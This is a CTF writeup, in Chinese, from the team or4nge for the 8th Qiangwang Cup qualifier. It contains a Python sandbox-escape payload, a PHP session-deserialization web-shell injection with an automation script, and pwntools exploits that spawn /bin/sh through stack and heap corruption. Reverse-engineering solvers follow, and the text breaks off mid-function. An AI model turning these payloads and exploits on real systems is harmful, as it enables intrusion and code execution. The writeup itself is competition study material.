---
title: qwbs8
titleTemplate: ':title | Writeups - or4nge'
layout: doc
---

# 第八届强网杯全国网络安全挑战赛线上赛 Writeup by or4nge

::: info
**Rank: 16**
:::

## Web

### PyBlockly

黑名单字符可以通过 Unicode 进行绕过，`print` 函数中可以通过闭合单引号来注入代码。命令执行后发现 flag 无权限读，SUID 找到 `dd`，使用 dd 命令读 flag 即可。

payload：

```json
{
    "blocks": {
        "languageVersion": 0,
        "blocks": [
            {
                "type": "print",
                "id": "IJ;4MrKCTatB86r)zU^1",
                "x": 13,
                "y": 79,
                "inputs": {
                    "TEXT": {
                        "block": {
                            "type": "text",
                            "id": "xt1FR`_gjkAOtmnM}jTW",
                            "fields": {
                                "TEXT": "＇）\n＿＿builtins＿＿．len＝lambda x： 0\n＿＿builtins＿＿．RuntimeError＝None\nprint（f＇｛＂＂．＿＿class＿＿．＿＿base＿＿．＿＿subclasses＿＿（）［127］．＿＿init＿＿．＿＿globals＿＿［＂builtins＂］．＿＿import＿＿（＂os＂）．system（＂dd if＝／flag of＝／dev／stdout＂）｝"
                            }
                        }
                    }
                }
            }
        ]
    }
}
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_0.png)

### platform

`www.zip`源码泄漏，开启了 session，同时对 session 中的字符进行了过滤，将恶意命令执行的字符串替换为空，存在字符串逃逸，同时存在可以利用的恶意类，注入 payload：

```plaintext
username=passthrupassthrupassthrupassthrupassthrupassthrupassthru&password=;session_key|O:15:"notouchitsclass":1:{s:4:"data";s:30:"("sys"."tem")($_GET["shell"]);";}password|s:1:"a
```

```python
import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'password': ';session_key|O:15:"notouchitsclass":1:{s:4:"data";s:30:"("sys"."tem")($_GET["shell"]);";}password|s:1:"a',
    'username': 'passthru' * 7
}

url = "http://eci-2zedfkwha8kfx4rmridr.cloudeci1.ichunqiu.com/"
while 1:
    s = requests.session()
    s.post(url + '/index.php', headers=headers,
           data=data, allow_redirects=False)
    s.post(url + '/index.php', headers=headers,
           data=data, allow_redirects=False)
    resp = s.post(url + '/dashboard.php?shell=/readflag',
                  headers=headers, allow_redirects=False)
    if "flag" in resp.text:
        print(resp.text)
        break
    s.close()
```

### xiaohuanxiong

`/admin/Authors` 路由可以未授权进入后台：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_1.png)

支付设置处可以注入任意代码：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_2.png)

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_3.png)

### snake

手动玩游戏到 50 分后得到路由： `/snake_win?username=`，测试存在 SQL 注入，通过 union 联合注入发现可以模板注入，直接打 SSTI 即可：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_4.png)

### Proxy

直接 SSRF 到 `/v1/api/flag` 路由即可：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_5.png)

## Pwn

### expect_number

有一个栈溢出的 backdoor，还有一个 try catch 的后门，game_struct 可以溢出到后面结构体的虚表指针，把低地址盖成 0x60（倒推可以推出序列，伪随机），栈溢出覆盖返回地址利用 try catch 执行后门。

```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'
import ctypes

def game(cho):
    p.sendlineafter(b'>> waiting for your choice ',b'1')
    p.sendlineafter(b'>> Which one do you choose? 2 or 1 or 0',str(cho).encode())

p=remote('39.105.114.252',36940)
#p=process('./pwn')
lib=ctypes.CDLL("libc.so.6")
lib.srand(1)
ll=[1,2,1,2,1,2,2,1,2,2,0,2,2,2,2,2,1,1,2]
for _ in range(0x114-len(ll)):
    num=lib.rand()%4+1
    #print(num)
    if num==4:
        randnum=1
    else:
        randnum=0
    game(randnum)
#gdb.attach(p)
for item in ll[:-1]:
    game(item)
p.sendlineafter(b'>> waiting for your choice ',b'2')
p.recvuntil(b'022222110')
pie=u64(p.recvline()[:-1].ljust(8,b'\x00'))-0x4c48
log.info(hex(pie))
game(2)
p.sendlineafter(b'>> waiting for your choice ',b'4')
#gdb.attach(p)
p.sendafter(b'Tell me your favorite number.',b'a'*0x20+p64(pie+0x5400)+p64(pie+0x251A))
p.interactive()
```

### chat-with-me

一个类似 vector 的东西，容量满后会 free 再 malloc 一块空间。可以任意 free 一个地址，把 input buffer free 一块进去，control struct 就可控了，易得栈地址和堆地址，任意地址读写。

```python
from pwn import *
import re
context.log_level='debug'
context.os='linux'
context.arch='amd64'

def bytes2hex(byte_data):
    hex_groups = []
    hex_list=[]
    for i in range(0, len(byte_data), 8):
        group = byte_data[i:i + 8]
        num = int.from_bytes(group, byteorder='little')  # 或 'little' 根据需要
        hex_list.append(num)
        hex_groups.append(f"0x{num:x}")
    return ' '.join(hex_groups),hex_list

def gets(a):
    numbers = re.findall(r'\d+', a.decode())
    byte_array = [int(num) for num in numbers]
    byte_data = bytes(byte_array)
    return byte_data

def add():
    p.sendlineafter(b'Choice > ',b'1')

def show(idx):
    p.sendlineafter(b'Choice > ',b'2')
    p.sendlineafter(b'Index > ',str(idx).encode())

def edit(idx,content):
    p.sendlineafter(b'Choice > ',b'3')
    p.sendlineafter(b'Index > ',str(idx).encode())
    p.sendafter(b'Content > ',content)

def delete(idx):
    p.sendlineafter(b'Choice > ',b'4')
    p.sendlineafter(b'Index > ',str(idx).encode())

def exitt():
    p.sendlineafter(b'Choice > ',b'5')

p=remote('47.94.195.201',39203)
#p=process('./pwn')
add()
show(0)
string,ll=bytes2hex(gets(p.recvline()))
log.info(string)
stack=ll[4]
heap=ll[1]-0x2960
mmap=ll[5]
edit(0,p64(0)+p64(0x2010-0x10+1)+b'a'*0x10+p64(heap+0x2960-0x2040+0x10))
for i in range(0x10):
    add()
libc_show=heap+0xa30
libc_off=-0x203b20
edit(0,p64(0)+p64(0x111)+p64(libc_show))
edit(0,p64(0)+p64(0x111)+p64(libc_show))
show(0)
string,ll=bytes2hex(gets(p.recvline()))
libcbase=ll[6]+libc_off
log.info('libcbase: '+hex(libcbase))
log.info(string)
#gdb.attach(p)
edit_off=-0x220
libc=ELF('./libc.so.6')
system=libc.symbols['system']+libcbase
bin_sh=next(libc.search(b'/bin/sh\x00'))+libcbase
rdi=0x10f75b+libcbase
ret=libcbase+0x2882f
edit(0,p64(0)+p64(0x111)+p64(stack+edit_off))
rop=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)
edit(0,rop)
p.interactive()
```

## Reverse

### Boxx

逆向可知是个推箱子游戏，dump 出 map 后最后四个地图可以看出来是 `qwb!`，以下脚本可解出单个箱子的情况的最少次数：

```cpp
#include<iostream>
#include<queue>
#include<cstring>
using namespace std;
int room[20][20];
int n,m,res;
struct node
{
    int x,y,step;
}per,fin,box;
bool pvis[20][20];
bool pbvis[20][20][20][20];
int rx[]={0,0,1,-1};
int ry[]={1,-1,0,0};
void bfs_per()
{
    queue<node>qper;
    memset(pvis,false,sizeof(pvis));
    qper.push(per);
    node cur,next;
    while(!qper.empty())
    {
        cur=qper.front();
        qper.pop();
        pvis[cur.x][cur.y]=true;
        for(int i=0;i<4;i++)
        {
            next.x=cur.x+rx[i];
            next.y=cur.y+ry[i];
            if(next.x>=0&&next.x<n&&next.y>=0&&next.y<m)
            if(room[next.x][next.y]==0)//可走
            if(!pvis[next.x][next.y])
                    qper.push(next);
        }
    }
}
void bfs_box()
{
    queue<node>qbox;
    qbox.push(box);
    qbox.push(per);
    node cur,next;
    while(!qbox.empty())
    {
        cur=qbox.front();
        qbox.pop();
        per=qbox.front();
        qbox.pop();
        if(cur.x==fin.x&&cur.y==fin.y)
        {
            if(res==-1||cur.step<res)
            res=cur.step;
            return ;
        }
        pbvis[cur.x][cur.y][per.x][per.y]=true;
        room[cur.x][cur.y]=2;
        bfs_per();
        room[cur.x][cur.y]=0;
        for(int i=0;i<4;i++)
        {
            next.x=cur.x+rx[i];
            next.y=cur.y+ry[i];
            next.step=cur.step+1;
            if(next.x>=0&&next.x<n&&next.y>=0&&next.y<m)
            if(room[next.x][next.y]==0)
                if(pvis[cur.x-rx[i]][cur.y-ry[i]])
                    if(!pbvis[next.x][next.y][cur.x][cur.y])
                        {
                            qbox.push(next);
                            qbox.push(cur);
                        }
        }
    }
}
int main()
{
    int T;
    cin>>T;
    while(T--)
    {
        cin>>n>>m;
        for(int i=0;i<n;i++)
        for(int j=0;j<m;j++)
        {
            cin>>room[i][j];
            if(room[i][j]==2)
            box.x=i,box.y=j,box.step=0;
            else if(room[i][j]==3)
            fin.x=i,fin.y=j,room[i][j]=0;
            else if(room[i][j]==4)
            per.x=i,per.y=j,room[i][j]=0;
        }
        res=-1;
        memset(pbvis,false,sizeof(pbvis));
        bfs_box();
        printf("%d\n",res);
    }
    return 0;
}
// flag{qwb!_d9dfb57a206f4008838417e2b0f88a43}
```

多个的手动玩，不难，flag：`flag{qwb!_d9dfb57a206f4008838417e2b0f88a43}`

### Mips

Qemu mips 虚拟机，查看关键逻辑，发现解出来不对

编译一个带符号版本的qemu，与题目给的程序对比，找到疑似作者设置的变量，找交叉引用发现关键逻辑

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_6.png)

其中 `sub_7F50E936448E` 为实际加密过程，去一下花指令，写出解密脚本

```python
from Crypto.Cipher import ARC4
cipher = [0x0C4, 0x0EE, 0x3C, 0x0BB, 0x0E7, 0x0FD, 0x67, 0x1D, 0x0F8, 0x97, 0x68, 0x9D, 0x0B, 0x7F, 0x0C7, 0x80, 0x0DF, 0x0F9, 0x4B, 0x0A0, 0x46, 0x91]

def rol(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xff

v15 = [0] * 256
for i in range(256):
    v15[i] = i
v5 = 0
v6 = 0
v13 = "6105t3"
for i in range(256):
    v10 = v15[v6]
    v11 = 2 * (v6 // 6 - (((2863311531 * v6) >> 32) & 0xFFFFFFFC)) + i
    v11 = ord(v13[v11])
    v5 += v10 + v11
    v1 = v6
    v6 += 1
    v15[v1] = v15[v5 % 256]
    v15[v5 % 256] = v10

v7 = 0
v8 = 0
v14 = [0] * 22
byte_7F50E9BC3A60 = [0x0DE, 0x0AD, 0x0BE, 0x0EF]

cipher[7], cipher[11] = cipher[11], cipher[7]
cipher[12], cipher[16] = cipher[16], cipher[12]
cipher = [cipher[i] ^ 0xa for i in range(len(cipher))]
for j in range(22):
    v7 += 1
    v12 = v15[v7]
    v8 += v12
    v15[v7 & 0xff] = v15[v8 & 0xff]
    v15[v8 & 0xff] = v12
    ans = cipher[j] ^ v15[(v15[v7] + v12) & 0xff] ^ byte_7F50E9BC3A60[j & 3]
    ans = rol(rol(rol(rol(ans, 5) ^ 0xDE, 4) ^ 0xAD, 3) ^ 0xBE ^ 0xFB, 3)
    print(chr(ans), end='')
```

### 斯内克

广度优先搜索，找到满足md5条件的路径

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <queue>
#include <tuple>
#include <iostream>

#define s11 7
#define s12 12
#define s13 17
#define s14 22
#define s21 5
#define s22 9
#define s23 14
#define s24 20
#define s31 4
#define s32 11
#define s33 16
#define s34 23
#define s41 6
#define s42 10
#define s43 15
#define s44 21

/**
 * @Basic MD5 functions.
 *
 * @param there bit32.
 *
 * @return one bit32.
 */
#define F(x, y, z) (((x) & (y)) | ((~x) & (z)))
#define G(x, y, z) (((x) & (z)) | ((y) & (~z)))
#define H(x, y, z) ((x) ^ (y) ^ (z))
#define I(x, y, z) ((y) ^ ((x) | (~z)))

/**
 * @Rotate Left.
 *
 * @param {num} the raw number.
 *
 * @param {n} rotate left n.
 *
 * @return the number after rotated left.
 */
#define ROTATELEFT(num, n) (((num) << (n)) | ((num) >> (32-(n))))

/**
 * @Transformations for rounds 1, 2, 3, and 4.
 */
#define FF(a, b, c, d, x, s, ac) { \
  (a) += F ((b), (c), (d)) + (x) + ac; \
  (a) = ROTATELEFT ((a), (s)); \
  (a) += (b); \
}
#define GG(a, b, c, d, x, s, ac) { \
  (a) += G ((b), (c), (d)) + (x) + ac; \
  (a) = ROTATELEFT ((a), (s)); \
  (a) += (b); \
}
#define HH(a, b, c, d, x, s, ac) { \
  (a) += H ((b), (c), (d)) + (x) + ac; \
  (a) = ROTATELEFT ((a), (s)); \
  (a) += (b); \
}
#define II(a, b, c, d, x, s, ac) { \
  (a) += I ((b), (c), (d)) + (x) + ac; \
  (a) = ROTATELEFT ((a), (s)); \
  (a) += (b); \
}

#include <string>
#include <cstring>

using std::string, std::queue, std::tuple, std::make_tuple, std::vector;
using std::cout, std::endl;

/* Define of btye.*/
typedef unsigned char byte;
/* Define of byte. */
typedef unsigned int bit32;

class MD5 {
public:
  /* Construct a MD5 object with a string. */
  MD5(byte* message, size_t len);

  /* Generate md5 digest. */
  const byte* getDigest();

  /* Convert digest to string value */
  string toStr();

private:
  /* Initialization the md5 object, processing another message block,
   * and updating the context.*/
  void init(const byte* input, size_t len);

  /* MD5 basic transformation. Transforms state based on block. */
  void transform(const byte block[64]);

  /* Encodes input (usigned long) into output (byte). */
  void encode(const bit32* input, byte* output, size_t length);

  /* Decodes input (byte) into output (usigned long). */
  void decode(const byte* input, bit32* output, size_t length);

private:
  /* Flag for mark whether calculate finished. */
  bool finished;

    /* state (ABCD). */
  bit32 state[4];

  /* number of bits, low-order word first. */
  bit32 count[2];

  /* input buffer. */
  byte buffer[64];

  /* message digest. */
  byte digest[16];

    /* padding for calculate. */
  static const byte PADDING[64];

  /* Hex numbers. */
  static const char HEX_NUMBERS[16];
};

/**
 * @file md5.cpp
 * @The implement of md5.
 * @author Jiewei Wei
 * @mail weijieweijerry@163.com
 * @github https://github.com/JieweiWei
 * @data Oct 19 2014
 *
 */

/* Define the static member of MD5. */
const byte MD5::PADDING[64] = { 0x80 };
const char MD5::HEX_NUMBERS[16] = {
  '0', '1', '2', '3',
  '4', '5', '6', '7',
  '8', '9', 'a', 'b',
  'c', 'd', 'e', 'f'
};

/**
 * @Construct a MD5 object with a string.
 *
 * @param {message} the message will be transformed.
 *
 */
MD5::MD5(byte* message, size_t len) {
  finished = false;
  /* Reset number of bits. */
  count[0] = count[1] = 0;
  /* Initialization constants. */
  state[0] = 0x67452301;
  state[1] = 0xefcdab89;
  state[2] = 0x98badcfe;
  state[3] = 0x10325476;

  /* Initialization the object according to message. */
  init((const byte*)message, len);
}

/**
 * @Generate md5 digest.
 *
 * @return the message-digest.
 *
 */
const byte* MD5::getDigest() {
  if (!finished) {
    finished = true;

    byte bits[8];
    bit32 oldState[4];
    bit32 oldCount[2];
    bit32 index, padLen;

    /* Save current state and count. */
    memcpy(oldState, state, 16);
    memcpy(oldCount, count, 8);

    /* Save number of bits */
    encode(count, bits, 8);

    /* Pad out to 56 mod 64. */
    index = (bit32)((count[0] >> 3) & 0x3f);
    padLen = (index < 56) ? (56 - index) : (120 - index);
    init(PADDING, padLen);

    /* Append length (before padding) */
    init(bits, 8);

    /* Store state in digest */
    encode(state, digest, 16);

    /* Restore current state and count. */
    memcpy(state, oldState, 16);
    memcpy(count, oldCount, 8);
  }
  return digest;
}

/**
 * @Initialization the md5 object, processing another message block,
 * and updating the context.
 *
 * @param {input} the input message.
 *
 * @param {len} the number btye of message.
 *
 */
void MD5::init(const byte* input, size_t len) {

  bit32 i, index, partLen;

  finished = false;

  /* Compute number of bytes mod 64 */
  index = (bit32)((count[0] >> 3) & 0x3f);

  /* update number of bits */
  if ((count[0] += ((bit32)len << 3)) < ((bit32)len << 3)) {
    ++count[1];
  }
  count[1] += ((bit32)len >> 29);

  partLen = 64 - index;

  /* transform as many times as possible. */
  if (len >= partLen) {

    memcpy(&buffer[index], input, partLen);
    transform(buffer);

    for (i = partLen; i + 63 < len; i += 64) {
      transform(&input[i]);
    }
    index = 0;

  } else {
    i = 0;
  }

  /* Buffer remaining input */
  memcpy(&buffer[index], &input[i], len - i);
}

/**
 * @MD5 basic transformation. Transforms state based on block.
 *
 * @param {block} the message block.
 */
void MD5::transform(const byte block[64]) {

  bit32 a = state[0], b = state[1], c = state[2], d = state[3], x[16];

  decode(block, x, 64);

  /* Round 1 */
  FF (a, b, c, d, x[ 0], s11, 0xd76aa478);
  FF (d, a, b, c, x[ 1], s12, 0xe8c7b756);
  FF (c, d, a, b, x[ 2], s13, 0x242070db);
  FF (b, c, d, a, x[ 3], s14, 0xc1bdceee);
  FF (a, b, c, d, x[ 4], s11, 0xf57c0faf);
  FF (d, a, b, c, x[ 5], s12, 0x4787c62a);
  FF (c, d, a, b, x[ 6], s13, 0xa8304613);
  FF (b, c, d, a, x[ 7], s14, 0xfd469501);
  FF (a, b, c, d, x[ 8], s11, 0x698098d8);
  FF (d, a, b, c, x[ 9], s12, 0x8b44f7af);
  FF (c, d, a, b, x[10], s13, 0xffff5bb1);
  FF (b, c, d, a, x[11], s14, 0x895cd7be);
  FF (a, b, c, d, x[12], s11, 0x6b901122);
  FF (d, a, b, c, x[13], s12, 0xfd987193);
  FF (c, d, a, b, x[14], s13, 0xa679438e);
  FF (b, c, d, a, x[15], s14, 0x49b40821);

  /* Round 2 */
  GG (a, b, c, d, x[ 1], s21, 0xf61e2562);
  GG (d, a, b, c, x[ 6], s22, 0xc040b340);
  GG (c, d, a, b, x[11], s23, 0x265e5a51);
  GG (b, c, d, a, x[ 0], s24, 0xe9b6c7aa);
  GG (a, b, c, d, x[ 5], s21, 0xd62f105d);
  GG (d, a, b, c, x[10], s22,  0x2441453);
  GG (c, d, a, b, x[15], s23, 0xd8a1e681);
  GG (b, c, d, a, x[ 4], s24, 0xe7d3fbc8);
  GG (a, b, c, d, x[ 9], s21, 0x21e1cde6);
  GG (d, a, b, c, x[14], s22, 0xc33707d6);
  GG (c, d, a, b, x[ 3], s23, 0xf4d50d87);
  GG (b, c, d, a, x[ 8], s24, 0x455a14ed);
  GG (a, b, c, d, x[13], s21, 0xa9e3e905);
  GG (d, a, b, c, x[ 2], s22, 0xfcefa3f8);
  GG (c, d, a, b, x[ 7], s23, 0x676f02d9);
  GG (b, c, d, a, x[12], s24, 0x8d2a4c8a);

  /* Round 3 */
  HH (a, b, c, d, x[ 5], s31, 0xfffa3942);
  HH (d, a, b, c, x[ 8], s32, 0x8771f681);
  HH (c, d, a, b, x[11], s33, 0x6d9d6122);
  HH (b, c, d, a, x[14], s34, 0xfde5380c);
  HH (a, b, c, d, x[ 1], s31, 0xa4beea44);
  HH (d, a, b, c, x[ 4], s32, 0x4bdecfa9);
  HH (c, d, a, b, x[ 7], s33, 0xf6bb4b60);
  HH (b, c, d, a, x[10], s34, 0xbebfbc70);
  HH (a, b, c, d, x[13], s31, 0x289b7ec6);
  HH (d, a, b, c, x[ 0], s32, 0xeaa127fa);
  HH (c, d, a, b, x[ 3], s33, 0xd4ef3085);
  HH (b, c, d, a, x[ 6], s34,  0x4881d05);
  HH (a, b, c, d, x[ 9], s31, 0xd9d4d039);
  HH (d, a, b, c, x[12], s32, 0xe6db99e5);
  HH (c, d, a, b, x[15], s33, 0x1fa27cf8);
  HH (b, c, d, a, x[ 2], s34, 0xc4ac5665);

  /* Round 4 */
  II (a, b, c, d, x[ 0], s41, 0xf4292244);
  II (d, a, b, c, x[ 7], s42, 0x432aff97);
  II (c, d, a, b, x[14], s43, 0xab9423a7);
  II (b, c, d, a, x[ 5], s44, 0xfc93a039);
  II (a, b, c, d, x[12], s41, 0x655b59c3);
  II (d, a, b, c, x[ 3], s42, 0x8f0ccc92);
  II (c, d, a, b, x[10], s43, 0xffeff47d);
  II (b, c, d, a, x[ 1], s44, 0x85845dd1);
  II (a, b, c, d, x[ 8], s41, 0x6fa87e4f);
  II (d, a, b, c, x[15], s42, 0xfe2ce6e0);
  II (c, d, a, b, x[ 6], s43, 0xa3014314);
  II (b, c, d, a, x[13], s44, 0x4e0811a1);
  II (a, b, c, d, x[ 4], s41, 0xf7537e82);
  II (d, a, b, c, x[11], s42, 0xbd3af235);
  II (c, d, a, b, x[ 2], s43, 0x2ad7d2bb);
  II (b, c, d, a, x[ 9], s44, 0xeb86d391);

  state[0] += a;
  state[1] += b;
  state[2] += c;
  state[3] += d;
}

/**
* @Encodes input (unsigned long) into output (byte).
*
* @param {input} usigned long.
*
* @param {output} byte.
*
* @param {length} the length of input.
*
*/
void MD5::encode(const bit32* input, byte* output, size_t length) {

  for (size_t i = 0, j = 0; j < length; ++i, j += 4) {
    output[j]= (byte)(input[i] & 0xff);
    output[j + 1] = (byte)((input[i] >> 8) & 0xff);
    output[j + 2] = (byte)((input[i] >> 16) & 0xff);
    output[j + 3] = (byte)((input[i] >> 24) & 0xff);
  }
}

/**
 * @Decodes input (byte) into output (usigned long).
 *
 * @param {input} bytes.
 *
 * @param {output} unsigned long.
 *
 * @param {length} the length of input.
 *
 */
void MD5::decode(const byte* input, bit32* output, size_t length) {
  for (size_t i = 0, j = 0; j < length; ++i, j += 4) {
    output[i] = ((bit32)input[j]) | (((bit32)input[j + 1]) << 8) |
    (((bit32)input[j + 2]) << 16) | (((bit32)input[j + 3]) << 24);
  }
}

/**
 * @Convert digest to string value.
 *
 * @return the hex string of digest.
 *
 */
string MD5::toStr() {
  const byte* digest_ = getDigest();
  string str;
  str.reserve(16 << 1);
  for (size_t i = 0; i < 16; ++i) {
    int t = digest_[i];
    int a = t / 16;
    int b = t % 16;
    str.append(1, HEX_NUMBERS[a]);
    str.append(1, HEX_NUMBERS[b]);
  }
  return str;
}

string computeCodeMD5(vector<unsigned char> path) {
    unsigned char code[1152] = {189, 189, 189, 189, 189, 189, 189, 189, 189, 189, 189, 56, 76, 176, 56, 109, 238, 63, 196, 180, 180, 9, 106, 240, 56, 44, 121, 246, 52, 233, 137, 56, 172, 127, 53, 212, 180, 180, 56, 109, 119, 246, 182, 56, 109, 120, 246, 182, 43, 24, 180, 180, 180, 59, 129, 129, 129, 129, 239, 78, 56, 76, 125, 246, 51, 212, 180, 180, 176, 232, 244, 180, 180, 180, 180, 176, 232, 246, 43, 39, 163, 29, 59, 244, 180, 180, 180, 56, 74, 192, 180, 176, 248, 4, 56, 137, 227, 195, 202, 59, 244, 180, 180, 180, 56, 74, 192, 196, 176, 248, 4, 56, 179, 103, 227, 22, 59, 244, 180, 180, 180, 56, 74, 192, 212, 176, 248, 4, 56, 182, 211, 182, 169, 59, 244, 180, 180, 180, 56, 74, 192, 228, 176, 248, 4, 56, 137, 216, 199, 51, 59, 244, 180, 180, 180, 56, 74, 192, 180, 43, 244, 180, 180, 180, 56, 74, 80, 180, 56, 76, 237, 181, 212, 180, 180, 76, 244, 212, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 196, 43, 244, 180, 180, 180, 56, 74, 80, 196, 56, 76, 237, 181, 212, 180, 180, 76, 244, 212, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 212, 43, 244, 180, 180, 180, 56, 74, 80, 212, 56, 76, 237, 181, 212, 180, 180, 76, 244, 212, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 228, 43, 244, 180, 180, 180, 56, 74, 80, 228, 56, 76, 237, 181, 212, 180, 180, 76, 244, 212, 44, 248, 133, 55, 176, 236, 254, 180, 180, 180, 180, 180, 180, 180, 111, 20, 76, 236, 254, 180, 180, 180, 47, 192, 44, 236, 254, 180, 180, 180, 204, 108, 254, 180, 180, 180, 182, 36, 204, 114, 180, 180, 180, 59, 244, 180, 180, 180, 56, 74, 192, 180, 43, 244, 180, 180, 180, 56, 74, 80, 196, 76, 121, 133, 55, 208, 210, 244, 91, 244, 180, 180, 180, 56, 74, 225, 196, 76, 249, 5, 55, 208, 98, 4, 227, 96, 91, 244, 180, 180, 180, 56, 74, 225, 196, 228, 121, 5, 55, 76, 233, 244, 204, 226, 228, 76, 225, 76, 249, 237, 56, 248, 76, 232, 244, 248, 228, 224, 168, 76, 193, 227, 96, 228, 121, 4, 55, 76, 208, 43, 244, 180, 180, 180, 56, 74, 80, 180, 44, 248, 133, 55, 76, 232, 246, 76, 105, 244, 228, 64, 76, 208, 44, 232, 244, 59, 244, 180, 180, 180, 56, 74, 192, 196, 43, 244, 180, 180, 180, 56, 74, 80, 180, 76, 121, 133, 55, 208, 210, 244, 91, 244, 180, 180, 180, 56, 74, 225, 180, 76, 249, 5, 55, 208, 98, 4, 227, 96, 91, 244, 180, 180, 180, 56, 74, 225, 180, 228, 121, 5, 55, 76, 233, 244, 208, 98, 100, 204, 226, 228, 76, 225, 76, 249, 237, 56, 248, 76, 232, 244, 248, 228, 224, 168, 76, 193, 227, 96, 228, 121, 4, 55, 76, 208, 43, 244, 180, 180, 180, 56, 74, 80, 196, 44, 248, 133, 55, 82, 84, 47, 47, 47, 176, 236, 0, 180, 180, 180, 180, 180, 180, 180, 111, 20, 76, 236, 0, 180, 180, 180, 47, 192, 44, 236, 0, 180, 180, 180, 204, 108, 0, 180, 180, 180, 182, 36, 204, 114, 180, 180, 180, 59, 244, 180, 180, 180, 56, 74, 192, 212, 43, 244, 180, 180, 180, 56, 74, 80, 228, 76, 121, 133, 55, 208, 210, 244, 91, 244, 180, 180, 180, 56, 74, 225, 228, 76, 249, 5, 55, 208, 98, 4, 227, 96, 91, 244, 180, 180, 180, 56, 74, 225, 228, 228, 121, 5, 55, 76, 233, 244, 204, 226, 228, 76, 225, 76, 249, 237, 56, 248, 76, 232, 244, 248, 228, 224, 168, 76, 193, 227, 96, 228, 121, 4, 55, 76, 208, 43, 244, 180, 180, 180, 56, 74, 80, 212, 44, 248, 133, 55, 76, 232, 246, 76, 105, 244, 228, 64, 76, 208, 44, 232, 244, 59, 244, 180, 180, 180, 56, 74, 192, 228, 43, 244, 180, 180, 180, 56, 74, 80, 212, 76, 121, 133, 55, 208, 210, 244, 91, 244, 180, 180, 180, 56, 74, 225, 212, 76, 249, 5, 55, 208, 98, 4, 227, 96, 91, 244, 180, 180, 180, 56, 74, 225, 212, 228, 121, 5, 55, 76, 233, 244, 208, 98, 100, 204, 226, 228, 76, 225, 76, 249, 237, 56, 248, 76, 232, 244, 248, 228, 224, 168, 76, 193, 227, 96, 228, 121, 4, 55, 76, 208, 43, 244, 180, 180, 180, 56, 74, 80, 228, 44, 248, 133, 55, 82, 84, 47, 47, 47, 59, 244, 180, 180, 180, 56, 74, 192, 180, 43, 244, 180, 180, 180, 56, 74, 80, 212, 76, 121, 133, 55, 76, 248, 4, 55, 227, 208, 43, 244, 180, 180, 180, 56, 74, 80, 180, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 196, 43, 244, 180, 180, 180, 56, 74, 80, 228, 76, 121, 133, 55, 76, 248, 4, 55, 227, 208, 43, 244, 180, 180, 180, 56, 74, 80, 196, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 228, 43, 244, 180, 180, 180, 56, 74, 80, 180, 76, 121, 133, 55, 76, 248, 4, 55, 227, 208, 43, 244, 180, 180, 180, 56, 74, 80, 228, 44, 248, 133, 55, 59, 244, 180, 180, 180, 56, 74, 192, 196, 43, 244, 180, 180, 180, 56, 74, 80, 212, 76, 121, 133, 55, 76, 248, 4, 55, 227, 208, 43, 244, 180, 180, 180, 56, 74, 80, 212, 44, 248, 133, 55, 160, 236, 66, 180, 180, 180, 61, 160, 236, 82, 180, 180, 180, 190, 160, 236, 98, 180, 180, 180, 81, 160, 236, 111, 180, 180, 180, 61, 160, 236, 127, 180, 180, 180, 91, 160, 236, 18, 180, 180, 180, 141, 160, 236, 34, 180, 180, 180, 101, 160, 236, 50, 180, 180, 180, 167, 160, 236, 191, 180, 180, 180, 77, 160, 236, 207, 180, 180, 180, 172, 160, 236, 223, 180, 180, 180, 248, 160, 236, 239, 180, 180, 180, 6, 160, 236, 255, 180, 180, 180, 233, 160, 236, 143, 180, 180, 180, 59, 160, 236, 159, 180, 180, 180, 163, 160, 236, 175, 180, 180, 180, 49, 176, 236, 245, 196, 180, 180, 180, 180, 180, 180, 111, 20, 76, 236, 245, 196, 180, 180, 47, 192, 44, 236, 245, 196, 180, 180, 204, 108, 245, 196, 180, 180, 181, 104, 230, 56, 202, 236, 245, 196, 180, 180, 36, 27, 248, 4, 55, 56, 202, 109, 245, 196, 180, 180, 36, 27, 125, 133, 66, 180, 180, 180, 99, 208, 247, 244, 211, 192, 111, 244, 111, 0, 187, 196, 56, 76, 63, 189, 189, 189, 189, 189};
    unsigned char v7[1152] = {0};
    unsigned char pre_p = 0;
    for (auto& p : path) {
        if (p == pre_p) continue;
        if (p == 0) {
            for (int i = 0; i < 1152; i++) {
                code[i] += 30;
            }
        }
        else if (p == 1) {
            for (int i = 0; i < 1152; i++) {
                v7[i] = code[(i + 6) % 1152];
            }
            memcpy(code, v7, 1152);
        }
        else if (p == 2) {
            for (int i = 0; i < 1152; i++) {
                code[i] = (code[i] << 3) | (code[i] >> 5);
            }
        }
        else if (p == 3) {
            for (int i = 0; i < 1152; i++) {
                code[i] -= 102;
            }
        }
        pre_p = p;
    }
    // cout << MD5(code, 1152).toStr() << endl;
    return MD5(code, 1152).toStr();
}

unsigned char goals[10000][2] = {
    {0}
};

void bfs() {
    queue<tuple<unsigned short, unsigned int, unsigned char>> q;
    queue<vector<unsigned char>> paths;

    q.push(make_tuple(0x0a0a, 0x00000000, 0xB4)); // (u, v, w)
    paths.push(vector<unsigned char>());
    int index = 0;

    while (!q.empty()) {
        auto [xy, dir_goal_index, key] = q.front();
        auto path = paths.front();

        unsigned char x = (xy >> 8) & 0xff;
        unsigned char y = xy & 0xff;
        unsigned char dir = dir_goal_index >> 24;
        unsigned int goal_index = dir_goal_index & 0xffffff;
        unsigned char current_goal_x = goals[goal_index][0];
        unsigned char current_goal_y = goals[goal_index][1];
        bool x_reverse_dir = false;
        bool y_reverse_dir = false;
        bool arrived = false;

        q.pop();
        paths.pop();
